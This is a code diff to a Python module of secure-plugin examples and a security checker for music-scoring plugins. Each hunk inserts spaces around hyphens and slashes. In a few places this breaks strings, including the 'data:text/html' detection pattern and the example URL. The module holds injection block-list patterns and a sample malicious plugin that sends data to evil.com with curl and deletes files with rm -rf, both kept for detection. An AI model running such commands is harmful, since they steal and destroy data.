@@ -1,5 +1,5 @@
 """
-Security examples and validation patterns for open-source plugin development.
+Security examples and validation patterns for open - source plugin development.
 
 This module provides examples of secure plugin development patterns and
 demonstrates how to avoid common security pitfalls when creating music
@@ -57,7 +57,7 @@ class SecurePluginExample(OpenSourceScoringPlugin):
             },
             input_requirements=["entity_id", "metric_value"],
             output_schema={"entity_id": "object", "security_score": "float64"},
-            tags=["security", "example", "best-practices"],
+            tags=["security", "example", "best - practices"],
         )
 
     def validate_input(self, data: pd.DataFrame) -> ValidationResult:
@@ -129,7 +129,7 @@ class SecurePluginExample(OpenSourceScoringPlugin):
                 entity_id = str(row["entity_id"])  # Ensure string type
                 metric_value = float(row["metric_value"])  # Ensure numeric type
 
-                # Safe calculation using only built-in operations
+                # Safe calculation using only built - in operations
                 security_score = min(max(metric_value * threshold, 0.0), 1.0)
 
                 results.append({"entity_id": entity_id, "security_score": security_score})
@@ -191,7 +191,7 @@ class AdvancedSecurityChecker(PluginSecurityChecker):
             "UPDATE SET",
             "<script",
             "javascript:",
-            "data:text/html",
+            "data:text / html",
         ]
 
     def check_plugin_security(self, plugin_code: str) -> ValidationResult:
@@ -222,7 +222,7 @@ class AdvancedSecurityChecker(PluginSecurityChecker):
             result.checked_items += 1
             has_error_handling = self._check_error_handling(tree)
             if not has_error_handling:
-                result.add_warning("Plugin should include proper error handling (try/except blocks)")
+                result.add_warning("Plugin should include proper error handling (try / except blocks)")
             result.passed_items += 1
 
         except SyntaxError as e:
@@ -373,8 +373,8 @@ import os
 import subprocess
 
 def malicious_function(self, data):
-    os.system("curl http://evil.com/steal?data=" + str(data))
-    subprocess.call(["rm", "-rf", "/important/files"])
+    os.system("curl http://evil.com / steal?data=" + str(data))
+    subprocess.call(["rm", "-rf", "/important / files"])
     return data
 """
 
@@ -388,8 +388,8 @@ def malicious_function(self, data):
 
     print("\n🎯 SECURITY RECOMMENDATIONS:")
     print("1. Always validate input data types and ranges")
-    print("2. Implement timeouts for long-running operations")
-    print("3. Use try/except blocks for error handling")
+    print("2. Implement timeouts for long - running operations")
+    print("3. Use try / except blocks for error handling")
     print("4. Avoid file system and network operations")
     print("5. Sanitize string inputs to prevent injection")
     print("6. Limit memory and CPU usage")
